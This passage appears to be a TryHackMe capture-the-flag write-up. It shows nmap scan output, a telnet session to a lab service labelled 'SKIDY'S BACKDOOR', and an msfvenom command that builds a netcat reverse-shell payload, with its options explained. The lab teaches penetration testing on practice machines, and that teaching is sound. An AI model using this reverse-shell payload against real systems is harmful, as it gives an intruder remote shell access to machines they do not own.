SF:ands\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x
SF:20to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x2
SF:0\.HELP\x20to\x20view\x20commands\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/18%OT=8012%CT=1%CU=37419%PV=Y%DS=2%DC=T%G=Y%TM=5FB4
OS:EEC4%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%TS=C)SEQ(S
OS:P=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW
OS:7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%
OS:W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   63.04 ms 10.8.0.1
2   62.89 ms 10.10.110.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 18 04:52:04 2020 -- 1 IP address (1 host up) scanned in 289.25 seconds
```

If i connect to the service i notice i notice a name, skidy and what this port is used as, a backdoor.

```text
telnet 10.10.110.177 8012
Trying 10.10.110.177...
Connected to 10.10.110.177.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services/images/130-6.png)

I generated the reverse shell payload: msfvenom -p cmd/unix/reverse_netcat lhost=10.8.5.181 lport=4444 R

p = payload  
lhost = our local host IP address  
lport = the port to listen on  
R = export the payload in raw format  

The ip differs because i restarted the machine, but here is the flag.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services/images/130-7.png)
